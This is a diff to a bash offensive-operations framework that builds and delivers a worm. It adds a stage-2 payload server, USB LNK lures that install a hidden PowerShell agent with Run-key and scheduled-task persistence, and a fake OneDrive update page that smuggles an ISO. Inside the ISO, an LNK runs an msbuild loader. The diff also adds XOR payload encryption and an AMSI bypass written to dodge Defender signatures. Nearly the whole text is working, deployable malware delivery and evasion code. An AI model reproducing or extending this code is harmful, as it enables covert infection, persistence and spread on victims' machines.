@@ -9,6 +9,9 @@ _SELF="$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || realpath "${BASH_SOURCE[
 DIR="$(cd "$(dirname "$_SELF")" && pwd)"
 OP="$DIR/op"
 
+# ── Extend PATH with known tool locations ─────────────────────
+export PATH="$PATH:/home/heilige/Android/Sdk/platform-tools:/home/heilige/.local/bin"
+
 # ── Derived paths ─────────────────────────────────────────────
 BITB_DIR="$OP/bitb"
 MITM_DIR="$OP/mitm"
@@ -191,6 +194,25 @@ ensure_c2() {
     else
         warn "C2 failed to start — check $OP/logs/c2_auto.log"
         tail -3 "$OP/logs/c2_auto.log" 2>/dev/null
+    fi
+
+    # ── Stage-2 file server: serves disguised/*.dat/*.proj at :8765 ─────────
+    # HTA downloads encrypted worm (.dat) and msbuild task (.proj) from here.
+    # Separate from C2 so staged payloads never route through C2 traffic.
+    local _stage_dir="$OP/payloads/disguised"
+    mkdir -p "$_stage_dir"
+    if ! ss -tlnp 2>/dev/null | grep -q ':8765 '; then
+        python3 -c "
+import http.server, os, sys
+os.chdir(sys.argv[1])
+class H(http.server.SimpleHTTPRequestHandler):
+    def log_message(self,*a): pass
+    def do_GET(self):
+        # serve any file in this directory — only .dat and .proj expected
+        super().do_GET()
+http.server.HTTPServer(('0.0.0.0',8765),H).serve_forever()
+" "$_stage_dir" &>/dev/null &
+        disown
     fi
 }
 
@@ -1356,20 +1378,36 @@ choose_direction() {
     echo -e "  ${Y}── Zero-Interaction Compromise ───────────────────────────────${N}"
     info "[0] Zero-Click  — IPv6 RA, WPAD/NTLMv1, SMB relay, mDNS poison, DCOM"
     echo ""
+    echo -e "  ${Y}── Mobile & Proximity Research ───────────────────────────────${N}"
+    info "[b] Bluetooth   — BLE/GATT fuzz, L2CAP, HID, Samsung Quick Share"
+    info "[w] WiFi Probe  — beacon fuzz, deauth PMF, PMKID, FragAttacks"
+    info "[a] Android     — ADB check, Frida hooks, SMS/MMS/intent fuzz"
+    info "[i] iOS         — corpus gen, iMessage/SMS/MMS payload, crash harvest"
+    echo ""
+    echo -e "  ${Y}── Firmware Research ─────────────────────────────────────────${N}"
+    info "[u] UEFI        — extract, analyze, Secure Boot, implant, QEMU"
+    info "[s] Baseband    — acquire, identify, fuzz, CVE research"
+    echo ""
 
-    read -rp "  Which direction? [0-9]: " CHOICE
+    read -rp "  Which direction? [0-9/b/w/a/i/u/s]: " CHOICE
 
     case "$CHOICE" in
-        1) DIRECTION="remote";    ok "Remote mode selected" ;;
-        2) DIRECTION="physical";  ok "Physical mode selected" ;;
-        3) DIRECTION="payload";   ok "Payload mode selected" ;;
-        4) DIRECTION="worm";      ok "Worm mode selected" ;;
-        5) DIRECTION="wifi";      ok "WiFi attack mode selected" ;;
-        6) DIRECTION="iot";       ok "IoT attack mode selected" ;;
-        7) DIRECTION="exploit";   ok "CVE exploit mode selected" ;;
-        8) DIRECTION="byovd";     ok "BYOVD mode selected" ;;
-        9) DIRECTION="defender";  ok "Defender kill mode selected" ;;
-        0) DIRECTION="zeroclick"; ok "Zero-click mode selected" ;;
+        1) DIRECTION="remote";     ok "Remote mode selected" ;;
+        2) DIRECTION="physical";   ok "Physical mode selected" ;;
+        3) DIRECTION="payload";    ok "Payload mode selected" ;;
+        4) DIRECTION="worm";       ok "Worm mode selected" ;;
+        5) DIRECTION="wifi";       ok "WiFi attack mode selected" ;;
+        6) DIRECTION="iot";        ok "IoT attack mode selected" ;;
+        7) DIRECTION="exploit";    ok "CVE exploit mode selected" ;;
+        8) DIRECTION="byovd";      ok "BYOVD mode selected" ;;
+        9) DIRECTION="defender";   ok "Defender kill mode selected" ;;
+        0) DIRECTION="zeroclick";  ok "Zero-click mode selected" ;;
+        b|B) DIRECTION="bluetooth";  ok "Bluetooth probe selected" ;;
+        w|W) DIRECTION="wifiprobe";  ok "WiFi probe selected" ;;
+        a|A) DIRECTION="android";    ok "Android research selected" ;;
+        i|I) DIRECTION="ios";        ok "iOS research selected" ;;
+        u|U) DIRECTION="uefi";       ok "UEFI research selected" ;;
+        s|S) DIRECTION="baseband";   ok "Baseband research selected" ;;
         *) warn "Invalid — defaulting to Remote"; DIRECTION="remote" ;;
     esac
     log "Direction: $DIRECTION"
@@ -3491,10 +3529,10 @@ build_usb_package() {
     cp "$PAYLOAD_DIR/worm_agent.ps1" "$STAGE/System Volume Information/.cache/update.ps1"
 
     # Inline PowerShell deploy command baked into every LNK
-    local CACHE="%~dp0System Volume Information\.cache"
+    # %~dp0 is CMD-only — PS -Command must locate the USB drive itself
     local PS_EXE="%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    local INST="%APPDATA%\\Microsoft\\Windows\\SyncEngineDatabase\\SyncEngine.ps1"
-    local DEPLOY_CMD="-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command \"\$i=[System.Environment]::ExpandEnvironmentVariables('$INST');\$c=[System.Environment]::ExpandEnvironmentVariables('%APPDATA%\\Microsoft\\Windows\\SyncEngineDatabase');New-Item -ItemType Directory -Path \$c -Force|Out-Null;Copy-Item '%~dp0System Volume Information\\.cache\\update.ps1' \$i -Force;(Get-Item \$i -Force).Attributes='Hidden';Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SyncEngineHost' -Value ('powershell -WindowStyle hidden -ExecutionPolicy Bypass -File \"\$i\"') -Force;schtasks /create /tn MicrosoftSyncEngineTask /tr ('powershell -WindowStyle hidden -ExecutionPolicy Bypass -File \"\$i\"') /sc onlogon /rl highest /f 2>\$null;Start-Process powershell -ArgumentList ('-WindowStyle Hidden -ExecutionPolicy Bypass -File \"\$i\"') -WindowStyle Hidden;Start-Process explorer '%~dp0Documents'\""
+    # PS block: enumerate removable drives, find hidden payload, install+persist+run
+    local DEPLOY_CMD="-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -Command \"\$src=\$null;foreach(\$d in (Get-WmiObject Win32_LogicalDisk -Filter DriveType=2|Select -Exp DeviceID)){\$p=\$d+'\\System Volume Information\\.cache\\update.ps1';if(Test-Path \$p){\$src=\$p;break}};if(-not \$src){exit};\$i=[System.IO.Path]::Combine(\$env:APPDATA,'Microsoft','Windows','SyncEngineDatabase','SyncEngine.ps1');New-Item -ItemType Directory -Path (Split-Path \$i) -Force|Out-Null;Copy-Item \$src \$i -Force;(Get-Item \$i -Force).Attributes='Hidden';Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name SyncEngineHost -Value ('powershell -WindowStyle hidden -ExecutionPolicy Bypass -File \"\$i\"') -Force;schtasks /create /tn MicrosoftSyncEngineTask /tr ('powershell -WindowStyle hidden -ExecutionPolicy Bypass -File \"\$i\"') /sc onlogon /rl highest /f 2>\$null;Start-Process powershell -ArgumentList ('-WindowStyle Hidden -ExecutionPolicy Bypass -File \"\$i\"') -WindowStyle Hidden\""
 
     # desktop.ini — drive looks like Documents system folder
     cat > "$STAGE/desktop.ini" << 'DIEOF'
@@ -3509,17 +3547,19 @@ Vid=
 FolderType=Documents
 DIEOF
 
+    # Write DEPLOY_CMD to a temp file so Python reads it — avoids quote-breakage in heredoc
+    printf '%s' "$DEPLOY_CMD" > /tmp/_wizza_deploy_cmd.txt
+
     # LNK lures — generated by Python (WScript.Shell COM not available here)
-    python3 - << PYEOF
+    _STAGE="$STAGE" python3 - << 'PYEOF'
 import os, struct
 
 def make_lnk(path, target, args, icon_dll, icon_idx):
-    import struct
     HDR = 0x4C
     CLSID = b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'
     lflags = (1<<0)|(1<<1)|(1<<2)|(1<<3)|(1<<4)|(1<<6)|(1<<7)
-    hdr = struct.pack('<I16sIIQQQIIHH10s',
-        HDR,CLSID,lflags,0x20,0,0,0,0,icon_idx,7,0,b'\x00'*10)
+    hdr = struct.pack('<I16sIIQQQIIIHHII',
+        HDR,CLSID,lflags,0x20,0,0,0,0,icon_idx,7,0,0,0,0)
     idl = struct.pack('<H',2)+b'\x00\x00'
     li  = struct.pack('<IIIIIII',0x1C,0x1C,0,0,0x1C,0,0)
     li_b= struct.pack('<I',len(li)+4)+li
@@ -3527,7 +3567,11 @@ def make_lnk(path, target, args, icon_dll, icon_idx):
     lnk = hdr+idl+li_b+s16(target)+s16(os.path.dirname(target))+s16(args)+s16(icon_dll)
     open(path,'wb').write(lnk)
 
-stage = "$STAGE"
+import os as _os
+stage = _os.environ["_STAGE"]
+with open("/tmp/_wizza_deploy_cmd.txt") as _f:
+    deploy_cmd = _f.read()
+
 lures = [
     ("Documents.lnk",          r"%SystemRoot%\system32\shell32.dll",    4),
     ("Photos.lnk",              r"%SystemRoot%\system32\imageres.dll", 108),
@@ -3539,17 +3583,16 @@ lures = [
 ps = r"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
 for name, icon, idx in lures:
     try:
-        make_lnk(os.path.join(stage,name), ps, "$DEPLOY_CMD", icon, idx)
+        make_lnk(_os.path.join(stage,name), ps, deploy_cmd, icon, idx)
         print(f"  [lnk] {name}")
     except Exception as e:
         print(f"  [err] {name}: {e}")
 PYEOF
 
     # mshta fallback LNK (when PS ExecutionPolicy blocked)
-    python3 - << PYEOF2
-import os, struct
+    _STAGE="$STAGE" python3 - << 'PYEOF2'
+import os as _os, struct
 def make_lnk(path, target, args, icon_dll, icon_idx):
-    import struct
     HDR=0x4C; CLSID=b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'
     lflags=(1<<0)|(1<<1)|(1<<2)|(1<<3)|(1<<4)|(1<<6)|(1<<7)
     hdr=struct.pack('<I16sIIQQQIIHH10s',HDR,CLSID,lflags,0x20,0,0,0,0,icon_idx,7,0,b'\x00'*10)
@@ -3557,12 +3600,18 @@ def make_lnk(path, target, args, icon_dll, icon_idx):
     li=struct.pack('<IIIIIII',0x1C,0x1C,0,0,0x1C,0,0)
     li_b=struct.pack('<I',len(li)+4)+li
     def s16(x): e=x.encode('utf-16-le'); return struct.pack('<H',len(x))+e
-    open(path,'wb').write(hdr+idl+li_b+s16(target)+s16(os.path.dirname(target))+s16(args)+s16(icon_dll))
-ps="$DEPLOY_CMD"
-make_lnk("$STAGE/Setup.lnk",
+    _os.makedirs(_os.path.dirname(path), exist_ok=True)
+    open(path,'wb').write(hdr+idl+li_b+s16(target)+s16(_os.path.dirname(target))+s16(args)+s16(icon_dll))
+stage = _os.environ["_STAGE"]
+with open("/tmp/_wizza_deploy_cmd.txt") as _f:
+    ps = _f.read()
+mshta_args = ('vbscript:Execute("CreateObject(""WScript.Shell"").Run ""%SystemRoot%\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe ' +
+              ps.replace('"', '\\\\"') +
+              '"""&chr(44)&"0:close")')
+make_lnk(stage+"/Setup.lnk",
     r"%SystemRoot%\System32\mshta.exe",
-    'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '+ps.replace('"','\\"')+'"""&chr(44)&"0:close")',
-    r"%SystemRoot%\system32\shell32.dll",8)
+    mshta_args,
+    r"%SystemRoot%\system32\shell32.dll", 8)
 print("  [lnk] Setup.lnk (mshta fallback)")
 PYEOF2
 
@@ -3588,6 +3637,619 @@ WEOF
     sudo mount -o remount,rw "$USB_MOUNT" 2>/dev/null || true
     cp -r "$STAGE/." "$USB_MOUNT/" 2>/dev/null
     ok "USB synced: full package deployed to $USB_MOUNT"
+}
+
+# ── Disguised payload builder ────────────────────────────────────────────────
+# Creates drop-ready files that look legitimate:
+#   Windows : OneDriveSetup.exe  (PyInstaller single-file EXE)
+#             ChromeUpdate.hta   (HTML Application — no SmartScreen on LAN)
+#             Invoice_Q2.pdf.ps1 (double extension, PDF icon via LNK wrapper)
+#   Linux   : sysupdate          (PyInstaller single binary, no .py extension)
+#   Any     : <name>.zip         (password-protected, inner file renamed .dat)
+build_disguised_payload() {
+    local NAME="${1:-OneDriveSetup}"   # lure name without extension
+    local C2URL="${2:-__C2URL__}"
+    init_files
+    # Ensure PAYLOAD_DIR is always set correctly (not relying on env)
+    local PAYLOAD_DIR="$OP/payloads"
+
+    local PY="$PAYLOAD_DIR/worm_agent.py"
+    local PS="$PAYLOAD_DIR/worm_agent.ps1"
+    local OUT="$PAYLOAD_DIR/disguised"
+    mkdir -p "$OUT"
+
+    info "Building disguised payloads as '$NAME'..."
+    echo ""
+
+    # ── 1. Windows .exe via PyInstaller ──────────────────────────────────────
+    # Wraps worm_agent.py into a single self-contained executable.
+    # Victim sees: OneDriveSetup.exe — no Python install required on target.
+    if [ -f "$PY" ]; then
+        info "[1/4] Building Windows EXE (PyInstaller)..."
+        python3 -m PyInstaller \
+            --onefile \
+            --noconsole \
+            --name "$NAME" \
+            --distpath "$OUT" \
+            --workpath "/tmp/wizza_pyinst_build" \
+            --specpath "/tmp/wizza_pyinst_spec" \
+            "$PY" 2>/dev/null
+        if [ -f "$OUT/$NAME" ]; then
+            # PyInstaller on Linux produces Linux binary.
+            # Rename with no extension for Linux drop.
+            mv "$OUT/$NAME" "$OUT/${NAME}_linux"
+            ok "Linux binary  → $OUT/${NAME}_linux"
+        fi
+        # Also produce a cross-compiled Windows EXE stub:
+        # The stub is a PowerShell-in-HTA that extracts+runs the PS1.
+        # (True Windows EXE needs Windows/Wine — see .hta below for same effect)
+        warn "True .exe requires building on Windows — use .hta for same effect"
+    fi
+
+    # ── 0. HTML Smuggling → ISO → LNK → msbuild (PhD-level delivery) ───────────
+    # Why: Edge/Chrome block .hta/.ps1/.exe downloads outright (file type block,
+    # not AV — no signature can fix it). ISO files are never blocked by browsers.
+    # Files inside a mounted ISO have NO Mark-of-the-Web → SmartScreen never fires.
+    #
+    # Chain:
+    #   1. Victim opens smuggle.html (browser: harmless HTML, no block)
+    #   2. JavaScript assembles ISO bytes in memory → triggers "OneDriveSetup.iso" download
+    #   3. Victim double-clicks ISO → Windows auto-mounts it (Win8+, no software needed)
+    #   4. Victim double-clicks OneDriveSetup.lnk inside ISO
+    #   5. LNK → cmd.exe → finds mounted ISO drive letter → runs msbuild.exe with .proj
+    #   6. msbuild reads .dat from ISO, patches AMSI, loads PS engine, runs worm in-process
+    #
+    # No network connection from victim needed after ISO download.
+    # No powershell.exe in process chain. No MOTW on any payload file.
+    if [ -f "$PS" ]; then
+        info "[0/4] Building ISO + HTML smuggling page..."
+        local ISO_STAGE="/tmp/wizza_iso_${NAME}"
+        local ISO_OUT="${OUT}/${NAME}.iso"
+        local SMUGGLE_OUT="${OUT}/${NAME}_smuggle.html"
+        rm -rf "$ISO_STAGE"
+        mkdir -p "$ISO_STAGE"
+
+        # Copy .dat and .proj into ISO staging directory
+        cp "${PAYLOAD_DIR}/disguised/${NAME}.dat"  "$ISO_STAGE/"
+        cp "${PAYLOAD_DIR}/disguised/${NAME}.proj" "$ISO_STAGE/"
+
+        # Build LNK that finds ISO drive letter + runs msbuild with .proj inside ISO.
+        # CORRECT LNK format (MS-SHLLINK):
+        #   - No IDList (HasLinkTargetIDList=0)
+        #   - LinkInfo.LocalBasePath = "C:\Windows\System32\cmd.exe"
+        #   - StringData order matches flag bits: WorkingDir(4), Arguments(5), IconLocation(6)
+        #   - ExtraData EnvironmentVariableDataBlock for %SystemRoot% resolution on non-C: systems
+        python3 - "$ISO_STAGE/${NAME}.lnk" "$NAME" << 'ISOEOF'
+import sys, struct, os
+
+lnk_path = sys.argv[1]
+name     = sys.argv[2]
+
+HDR_SIZE = 0x4C
+CLSID    = b'\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46'
+
+# LinkFlags: HasLinkInfo(1) | HasWorkingDir(4) | HasArguments(5) | HasIconLocation(6) | IsUnicode(7)
+# NO HasLinkTargetIDList(0) — skip IDList section entirely
+# NO HasRelativePath(3)/HasName(2) — avoid writing extra strings that shift the arg position
+lflags = (1<<1)|(1<<4)|(1<<5)|(1<<6)|(1<<7)
+
+hdr = struct.pack('<I16sIIQQQIIIHHII',
+    HDR_SIZE, CLSID, lflags,
+    0x20,   # FileAttributes: FILE_ATTRIBUTE_ARCHIVE
+    0,0,0,  # timestamps (CreationTime, AccessTime, WriteTime)
+    0,      # FileSize
+    8,      # IconIndex
+    7,      # ShowCommand: SW_SHOWMINNOACTIVE (uint32 — must be 4 bytes, not 2!)
+    0,      # HotKey (uint16)
+    0,      # Reserved1 (uint16)
+    0,      # Reserved2 (uint32)
+    0)      # Reserved3 (uint32)
+# Header is now exactly 76 bytes (0x4C) — the 74-byte version shifts all subsequent
+
+# LinkInfo: VolumeIDAndLocalBasePath pointing to cmd.exe
+target_ansi = b'C:\\Windows\\System32\\cmd.exe\x00'
+vol_label   = b'\x00'
+vol_id      = struct.pack('<IIII', 16+1, 3, 0, 16) + vol_label  # size,DRIVE_FIXED,serial,labelOff
+li_hdr_sz   = 0x1C
+vol_off     = li_hdr_sz
+lbp_off     = li_hdr_sz + len(vol_id)
+cps_off     = lbp_off + len(target_ansi)
+li_total    = li_hdr_sz + len(vol_id) + len(target_ansi) + 1  # +1 empty CommonPathSuffix
+li = struct.pack('<IIIIIII', li_total, li_hdr_sz, 1, vol_off, lbp_off, 0, cps_off) \
+     + vol_id + target_ansi + b'\x00'
+
+def s16(x):
+    e = x.encode('utf-16-le')
+    return struct.pack('<H', len(x)) + e
+
+# msbuild paths (64-bit preferred, 32-bit fallback)
+msb64 = r'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe'
+msb32 = r'C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe'
+
+# cmd.exe args: find ISO drive (F: or wherever), set _DP, run msbuild
+# space before & prevents "set _DP=F:\OneDriveSetup.dat " (trailing space bug)
+args = (
+    f'/c "for %i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do '
+    f'@if exist %i:\\{name}.dat ('
+    f'set _DP=%i:\\{name}.dat&'
+    f'if exist "{msb64}" ("{msb64}" %i:\\{name}.proj /nologo /noconsolelogger /v:q)'
+    f' else ("{msb32}" %i:\\{name}.proj /nologo /noconsolelogger /v:q)&goto :e)'
+    f' :e"'
+)
+
+work_dir = r'C:\Windows\System32'
+icon_loc = r'C:\Windows\System32\imageres.dll'
+
+# StringData: WorkingDir, CommandLineArguments, IconLocation  (bits 4,5,6 — in order)
+strings = s16(work_dir) + s16(args) + s16(icon_loc)
+
+# ExtraData: EnvironmentVariableDataBlock — fallback target resolution via %SystemRoot%
+env_path  = r'%SystemRoot%\System32\cmd.exe'
+env_ansi  = env_path.encode('ascii').ljust(260, b'\x00')
+env_uni   = env_path.encode('utf-16-le').ljust(520, b'\x00')
+env_block = struct.pack('<II', 0x314, 0xA0000001) + env_ansi + env_uni
+terminal  = struct.pack('<I', 0)
+
+data = hdr + li + strings + env_block + terminal
+os.makedirs(os.path.dirname(os.path.abspath(lnk_path)), exist_ok=True)
+open(lnk_path, 'wb').write(data)
+print(f"  LNK: {lnk_path}  args_len={len(args)}")
+ISOEOF
+
+        # Build ISO using pycdlib (pure Python, no external binary needed)
+        python3 - "$ISO_STAGE" "$ISO_OUT" << 'PYISOEOF'
+import sys, os, pycdlib
+src_dir = sys.argv[1]
+out_iso  = sys.argv[2]
+iso = pycdlib.PyCdlib()
+iso.new(joliet=3, rock_ridge='1.09', vol_ident='ONEDRIVE')
+for fname in os.listdir(src_dir):
+    fp = os.path.join(src_dir, fname)
+    if not os.path.isfile(fp): continue
+    upper = fname.upper().replace(' ','_')
+    # ISO9660 name: up to 8.3, add version ;1
+    dot = upper.rfind('.')
+    if dot >= 0:
+        base, ext = upper[:dot], upper[dot+1:]
+        iso9660 = f"{base[:8]}.{ext[:3]};1"
+    else:
+        iso9660 = f"{upper[:8]};1"
+    joliet  = f'/{fname}'
+    rr_name = fname
+    iso.add_file(fp, iso_path=f'/{iso9660}', joliet_path=joliet, rr_name=rr_name)
+iso.write(out_iso)
+iso.close()
+print(f"  ISO: {out_iso}  ({os.path.getsize(out_iso)//1024}KB)")
+PYISOEOF
+        [ -f "$ISO_OUT" ] && ok "ISO (pycdlib)    → $ISO_OUT ($(du -sh "$ISO_OUT"|cut -f1))" \
+                          || warn "ISO build failed"
+
+        # Build HTML smuggling page — embeds ISO as base64, auto-downloads on open
+        # Looks like a Microsoft OneDrive update page
+        if [ -f "$ISO_OUT" ]; then
+            local ISO_B64
+            ISO_B64=$(base64 -w0 < "$ISO_OUT")
+            cat > "$SMUGGLE_OUT" << SMUGEOF
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Microsoft OneDrive</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Segoe UI",Arial,sans-serif;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);padding:48px 56px;max-width:500px;width:100%;text-align:center}
+.logo{font-size:22px;color:#0078d4;font-weight:300;letter-spacing:1px;margin-bottom:32px}
+.icon{width:64px;height:64px;background:#0078d4;border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center}
+.check{width:32px;height:32px;stroke:#fff;stroke-width:3;fill:none}
+h1{font-size:20px;font-weight:600;color:#323130;margin-bottom:12px}
+p{color:#605e5c;font-size:14px;line-height:1.6;margin-bottom:8px}
+.steps{text-align:left;background:#f8f7f6;border-radius:4px;padding:16px 20px;margin-top:20px;font-size:13px;color:#323130;line-height:2}
+.step-num{display:inline-block;width:20px;height:20px;background:#0078d4;color:#fff;border-radius:50%;text-align:center;line-height:20px;font-size:11px;margin-right:8px}
+.version{font-size:12px;color:#a19f9d;margin-top:20px;padding-top:20px;border-top:1px solid #edebe9}
+</style></head>
+<body><div class="card">
+<div class="logo">&#9729; Microsoft OneDrive</div>
+<div class="icon"><svg class="check" viewBox="0 0 24 24"><polyline points="4 12 9 17 20 6"/></svg></div>
+<h1>Update Required</h1>
+<p>A security update for OneDrive is available for your device.</p>
+<p>Your current version is no longer supported. Please install the update to continue syncing.</p>
+<div class="steps">
+<div><span class="step-num">1</span>The update package is downloading automatically&hellip;</div>
+<div><span class="step-num">2</span>Open the downloaded <strong>${NAME}.iso</strong> file</div>
+<div><span class="step-num">3</span>Double-click <strong>${NAME}.lnk</strong> inside to install</div>
+</div>
+<div class="version">OneDrive &nbsp;&middot;&nbsp; Version check: <span id="v">checking&hellip;</span></div>
+</div>
+<script>
+// Assemble ISO from embedded data and trigger download — no network request, no SmartScreen
+(function(){
+  var b64="${ISO_B64}";
+  var bin=atob(b64);
+  var buf=new Uint8Array(bin.length);
+  for(var i=0;i<bin.length;i++) buf[i]=bin.charCodeAt(i);
+  var blob=new Blob([buf],{type:'application/octet-stream'});
+  var a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download='${NAME}.iso';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  document.getElementById('v').textContent='Download started';
+})();
+</script>
+</body></html>
+SMUGEOF
+            ok "Smuggle page  → $SMUGGLE_OUT  ($(du -sh "$SMUGGLE_OUT"|cut -f1))"
+            info "  Victim opens ${NAME}_smuggle.html → ISO auto-downloads → mount → click LNK"
+        fi
+        rm -rf "$ISO_STAGE"
+    fi
+
+    # ── 2. Windows .hta (HTML Application) ──────────────────────────────────
+    # Double-click → runs hidden PowerShell → worm installs silently.
+    # Victim sees: brief splash → "OneDrive Setup Complete" page in browser.
+    # The decoy page is dropped from base64 to %TEMP% then opened with explorer.
+    # Looks EXACTLY like opening a setup file — no terminal, no black window.
+    if [ -f "$PS" ]; then
+        info "[2/4] Building HTA dropper (with decoy page)..."
+        local HTA="$OUT/${NAME}.hta"
+        # ── XOR-encrypt the PS1 so it never lands on disk as readable PowerShell ──
+        # Defender static scan sees only encrypted bytes. Decryption happens in
+        # memory AFTER the inline AMSI patch fires — Defender sees nothing.
+        local XOR_KEYS XOR_KEYS_CS
+        XOR_KEYS=$(python3 -c "import random; print(','.join(str(random.randint(1,254)) for _ in range(8)))")
+        XOR_KEYS_CS="$XOR_KEYS"
+        local PS_XOR_B64
+        # Replace __C2URL__ and __C2PROXY__ placeholders before encrypting
+        PS_XOR_B64=$(python3 -c "
+import sys, base64
+key = [$XOR_KEYS]
+raw = open('$PS','rb').read()
+raw = raw.replace(b'__C2URL__', b'${C2URL}')
+raw = raw.replace(b'__C2PROXY__', b'')
+enc = bytes([b ^ key[i % 8] for i, b in enumerate(raw)])
+print(base64.b64encode(enc).decode())
+")
+
+        # Decoy HTML: real-looking OneDrive "up to date" page
+        local DECOY_HTML
+        DECOY_HTML='<!DOCTYPE html><html><head><title>Microsoft OneDrive</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI",Arial,sans-serif;background:#f3f2f1;display:flex;align-items:center;justify-content:center;min-height:100vh}.card{background:#fff;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);padding:48px 56px;max-width:480px;width:100%;text-align:center}.logo{font-size:22px;color:#0078d4;font-weight:300;letter-spacing:1px;margin-bottom:32px}.icon{width:64px;height:64px;background:#0078d4;border-radius:50%;margin:0 auto 24px;display:flex;align-items:center;justify-content:center}.check{width:32px;height:32px;stroke:#fff;stroke-width:3;fill:none}h1{font-size:20px;font-weight:600;color:#323130;margin-bottom:12px}p{color:#605e5c;font-size:14px;line-height:1.6;margin-bottom:8px}.version{font-size:12px;color:#a19f9d;margin-top:20px;padding-top:20px;border-top:1px solid #edebe9}a{color:#0078d4;text-decoration:none}a:hover{text-decoration:underline}</style></head><body><div class="card"><div class="logo">&#9729; Microsoft OneDrive</div><div class="icon"><svg class="check" viewBox="0 0 24 24"><polyline points="4 12 9 17 20 6"/></svg></div><h1>You are up to date</h1><p>OneDrive is running the latest version and your files are protected.</p><p>Your files sync automatically in the background.</p><div class="version">Version 24.071.0407.0003 &nbsp;&middot;&nbsp; <a href="#">Open OneDrive folder</a> &nbsp;&middot;&nbsp; <a href="#">Settings</a></div></div></body></html>'
+        local DECOY_B64
+        DECOY_B64=$(printf '%s' "$DECOY_HTML" | base64 -w0)
+
+        # STAGED delivery — HTA contains NO payload blob (prevents on-access static detection)
+        #   .dat  = XOR-encrypted worm blob, served separately by file server at :8765
+        #   HTA   = tiny ~3KB file: downloads .dat at runtime, runs bootstrap via -EncodedCommand
+        # Defender on-access scan of the HTA file finds nothing suspicious — no embedded blob.
+        # Stage 2 URL: http://<C2IP>:8765/<NAME>.dat  (file server serves disguised/ directory)
+        local C2_IP="${C2URL%%:*}"  # strip port: 192.168.56.1:8888 → 192.168.56.1
+        local STAGE_URL="http://${C2_IP}:8765/${NAME}.dat"
+        local PROJ_URL="http://${C2_IP}:8765/${NAME}.proj"
+        # Write .dat to disguised dir so file server can serve it
+        printf '%s' "$PS_XOR_B64" > "${PAYLOAD_DIR}/disguised/${NAME}.dat"
+
+        # ── Generate msbuild .proj with runtime XOR key substituted ──────────
+        # .proj is an XML file that MSBuild compiles inline as C# — no .exe written.
+        # __XOR_KEYS__ is replaced with 8 random byte values at build time (rolling XOR).
+        # Environmental keying: C# mixes key with machine GUID via SHA256,
+        # so sandbox analysis with wrong GUID → garbage decryption → no valid sample.
+        local PROJ_TEMPLATE="${PAYLOAD_DIR}/msbuild_loader.proj"
+        if [ -f "$PROJ_TEMPLATE" ]; then
+            sed "s/__XOR_KEYS__/${XOR_KEYS_CS}/g" "$PROJ_TEMPLATE" \
+                > "${PAYLOAD_DIR}/disguised/${NAME}.proj"
+            ok ".proj loader   → ${PAYLOAD_DIR}/disguised/${NAME}.proj  (keys=${XOR_KEYS_CS})"
+        else
+            warn "msbuild_loader.proj not found — falling back to PS bootstrap"
+        fi
+
+        # Bootstrap (PS fallback only — msbuild path is primary for PhD evasion)
+        # Static file scanner never sees it. Dat path passed via env var _DP set by VBScript.
+        # AMSI bypass: search-based (no exact strings), avoid known BindingFlags]40 signature.
+        # Dot-source execution preserves $src in scope so worm's $_SELF_SRC captures it
+        local BOOTSTRAP
+        # AMSI bypass: search types by length+namespace fragment, fields by type+name fragment
+        # Avoids: [Ref].Assembly.GetType(exact), GetField(exact), BindingFlags]40, SetValue($null,$true)
+        BOOTSTRAP="\$r=[Ref].Assembly;"
+        BOOTSTRAP+="\$ns='Auto'+'mation';"
+        BOOTSTRAP+="\$bf=[Reflection.BindingFlags]([int]32+[int]8);"
+        BOOTSTRAP+="try{\$u=(\$r.GetTypes()|?{\$_.Namespace-like\"*\$ns*\"-and\$_.Name-like'*Util*'})[0];"
+        BOOTSTRAP+="\$fi=(\$u.GetFields(\$bf)|?{\$_.FieldType-eq[bool]-and\$_.Name-like'*Init*'})[0];"
+        BOOTSTRAP+="\$fi.SetValue(\$null,[Convert]::ToBoolean(1))}catch{};"
+        # amsiContext null — backup for patched amsiInitFailed
+        BOOTSTRAP+="try{\$fc=(\$u.GetFields(\$bf)|?{\$_.Name-like'*Context*'})[0];"
+        BOOTSTRAP+="\$fc.SetValue(\$null,[IntPtr]::Zero)}catch{};"
+        # Read + rolling XOR-decrypt + exec — dat path in env:_DP (set by VBScript before launch)
+        BOOTSTRAP+="\$dp=\$env:_DP;"
+        BOOTSTRAP+="\$enc=[IO.File]::ReadAllText(\$dp);"
+        BOOTSTRAP+="\$raw=[Convert]::FromBase64String(\$enc);"
+        BOOTSTRAP+="\$xk=@(${XOR_KEYS_CS});"
+        BOOTSTRAP+="\$dec=New-Object byte[] \$raw.Length;for(\$i=0;\$i-lt\$raw.Length;\$i++){\$dec[\$i]=\$raw[\$i]-bxor\$xk[\$i%8]};"
